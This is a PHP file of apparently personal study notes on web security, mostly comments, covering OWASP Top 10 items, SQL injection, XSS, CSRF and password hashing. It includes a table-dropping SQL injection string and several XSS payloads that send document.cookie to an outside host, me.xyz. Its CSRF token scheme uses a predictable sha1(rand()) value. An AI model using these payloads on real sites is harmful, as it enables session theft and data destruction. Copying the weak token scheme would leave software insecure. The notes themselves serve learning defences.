<?php
//Web Security
// Performance, Security, Maintainability, Scalability
// 100% Security
// Risk Management
//Security, Usability, Cost
// Web Application -> Application Security - Code, Technology, Software Security - Web Server, Programming Language, Server Operating System, Database ,
//Network Security - Network Infrastructure, Hardware Security - Network Devices, Server Devices, Physical Security - Data Center, Server Room.

//OWASP(Open Web Application Security Project) Top 10 - Web Application Security
// Injection - SQL Injection
// Broken Authentication - User Login Data->Cookie->Open->role=1->role=3->Admin Panel, Session->Session ID
// Sensitive Data Exposure - Credit Card Information, Password, etc.
// XML External Entity (XXE) Injection
// Broken Access Control
// Security Misconfiguration-> Hosting, VPS, Cloud Service, Web Server, Database Server
// Cross-Site Scripting (XSS)
// Insecure Deserialization -> PHP->eval()->String-> eval("echo 1 + 2;")->Result->1 + 2->3
// Using Component with known vulnerabilities-> Wordpress->PHP CMS-> Themes, Plugins
// Insufficient Logging & Monitoring->Login Log, Access Log, Error Log

//SQL Injection-> User Input->SQL Query->SQL Injection->SQL Injection->SQL Injection, URL Query Input, Form Input.

//get.php
//$id = $_GET['id'];
//$sql = "SELECT * FROM users WHERE id = $id";

//get.php?id=1;drop table users; -> SELECT * FROM users WHERE id = 1;drop table users;

//Prepared Statement
//$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
//$stmt->execute(['id' => $id]);

//XSS -> Cross Site Scripting -> Script Injection -> JavaScript
//get.php?name=<script>alert('XSS')</script>

//<script>location.href='http://me.xyz?c='+document.cookie;</script>
// PHP -> htmlspecialchars() -><script> -> &lt;script&gt;
//<img> src="http://me.xyz?c="+document.cookie;
//<a> href="http://me.xyz?c="+document.cookie;
//onClick="alert('XSS')", onMouseOver="alert('XSS')",

//echo htmlspecialchars($comment);
//function h($content) {
//    return htmlspecialchars($content);
//}
//echo h($comment);

//HTML Purifier

// CSRF -> Cross Site Request Forgery
// localhost/project/_delete.php?id=1
// <img src="http://localhost/project/_delete.php?id=1">
//echo sha1(rand(1, 1000) . time());
//session_start();
//$token = sha1(rand(1, 1000) . 'csrf secret');
//$_SESSION['csrf_token'] = $token;
//
//<!--<a href="delete.php?id=1&csrf_token=--><?php //$token ?><!--">Delete</a>-->

<!--// delete.php-->
<!--session_start();-->
<!--if($_GET['csrf_token'] === $_SESSION['csrf_token']) {-->
<!--    echo "Good request";-->
<!--} else {-->
<!--    echo "Bad request";-->
<!--}-->

// Hash Functions
// md5(), sha1()
//md5() -> 32 characters
//sha1() -> 40 characters
// Encryption -> Decryption -> Content
// Hash Algorithm, Encryption Algorithm

// md5('hello') -> 5d41402abc4b2a76b9719d911017c592

//bcrypt()
//password_hash()

//Saving Passwords -> Hashing -> Storing
<?php
echo "<br>";
$password = 'hello';
$hash = password_hash($password, PASSWORD_DEFAULT); //PASSWORD_BCRYPT
echo $hash;
?>

<!--$2y$10$, 10 -> Cost Factor, 2 power 10, 1024-->

$hash = '$2y$12$L/GjDMb/ZqOA5P6n7RjeDOXsv9qs9QSxj5trZDjOjCdZx5oW.Fuqy';

if(password_verify('userpassword', $hash)) {
    echo "Good password";
} else {
    echo "Bad password";
}


